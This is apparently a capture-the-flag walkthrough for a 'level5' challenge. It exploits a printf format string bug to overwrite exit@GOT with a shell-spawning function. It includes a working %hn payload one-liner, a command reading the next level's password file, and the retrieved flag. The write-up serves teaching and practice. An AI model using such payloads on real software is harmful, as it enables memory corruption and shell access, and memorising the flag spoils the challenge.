# Level 5 Walkthrough

## Objective
Exploit a format string vulnerability to overwrite `exit()` in the GOT (Global Offset Table) with the address of function `o()`, which spawns a shell.

## The Vulnerability

```c
void o(void) {
    system("/bin/sh");
}

void n(void) {
    char buffer[512];
    fgets(buffer, 512, stdin);
    printf(buffer);  // Format string vulnerability!
    exit(1);
}
```

**The problem**: User input goes directly to `printf()` without a format string.

**The opportunity**: 
- There's a function `o()` that spawns a shell
- The program calls `exit(1)` after printf
- We can overwrite `exit@GOT` to point to `o()` instead!

## Finding the Addresses

### 1. Find the address of function `o()`

```bash
objdump -t level5 | grep " o$"
```

Result: `o` is at **0x080484a4**

### 2. Find the GOT entry for `exit()`

```bash
objdump -R level5 | grep exit
```

Result: `exit@GOT` is at **0x08049838**

### 3. Find the stack offset

```bash
python -c "print 'AAAA' + ' %x'*10" | ./level5
```

Look for `41414141` (AAAA in hex). It appears at position **4**.

This means our input starts at `%4$` on the stack.

## The Exploit

We need to write `0x080484a4` to address `0x08049838`.

We'll split this into two 2-byte writes using `%hn`:
- Write **0x0804** to `0x0804983a` (high 2 bytes)
- Write **0x84a4** to `0x08049838` (low 2 bytes)

### Why write in this order?

We write the smaller value first (0x0804 = 2052) then the larger (0x84a4 = 33956).

### The Payload Structure

```
[address1][address2][padding to 0x0804][%4$hn][padding to 0x84a4][%5$hn]
```

Breaking it down:
1. **8 bytes**: Two addresses (4 bytes each)
   - `0x0804983a` (GOT+2, for high bytes)
   - `0x08049838` (GOT, for low bytes)

2. **Print 2044 more bytes** to reach total of 2052 (0x0804)
   - Use `%2044x` to print padding

3. **Write with %4$hn** to first address

4. **Print 31904 more bytes** to reach total of 33956 (0x84a4)
   - Use `%31904x` to print padding

5. **Write with %5$hn** to second address

### The Math

```
Start: 8 bytes (two addresses)
After %2044x: 8 + 2044 = 2052 = 0x0804 ✓
After %31904x: 2052 + 31904 = 33956 = 0x84a4 ✓
```

## Running the Exploit

### Simple one-liner:

```bash
(python -c "print('\x3a\x98\x04\x08' + '\x38\x98\x04\x08' + '%2044x%4\$hn' + '%31904x%5\$hn')"; cat) | ./level5
```

Or with reversed byte order for clarity:

```bash
(python -c "print('\x08\x04\x98\x3a'[::-1] + '\x08\x04\x98\x38'[::-1] + '%2044x%4\$hn' + '%31904x%5\$hn')"; cat) | ./level5
```

### Get the flag:

```bash
cat /home/user/level6/.pass
```

Result: **d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31**

## How It Works

1. **Input contains two addresses** at the start (little-endian)
2. **printf() reads them from stack** at positions %4$ and %5$
3. **%2044x prints padding** (2044 spaces) → total printed = 2052 = 0x0804
4. **%4$hn writes 0x0804** to address at %4$ (0x0804983a)
5. **%31904x prints more padding** → total printed = 33956 = 0x84a4
6. **%5$hn writes 0x84a4** to address at %5$ (0x08049838)
7. **exit@GOT now points to o()** instead of exit()
8. **When exit(1) is called**, it jumps to o()
9. **o() executes /bin/sh** → Shell spawned!

## Key Concepts

### Format String Vulnerability

`printf(user_input)` allows attackers to:
- Read from stack: `%x`, `%s`
- Write to memory: `%n`, `%hn`
- Access specific positions: `%4$x`, `%5$hn`

### GOT (Global Offset Table)

The GOT stores addresses of library functions. When you call `exit()`, the program looks up the address in the GOT. By overwriting this entry, we redirect execution.

### %hn (Half-word Write)

`%hn` writes 2 bytes (16 bits) instead of 4 bytes. This makes it easier to write specific values without printing billions of characters.

## Summary

- **Vulnerability**: Format string in `printf(buffer)`
- **Target**: Overwrite `exit@GOT` (0x08049838) with address of `o()` (0x080484a4)
- **Technique**: Two `%hn` writes to write 4 bytes in two 2-byte chunks
- **Result**: Shell as level6, flag retrieved

**Flag**: d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
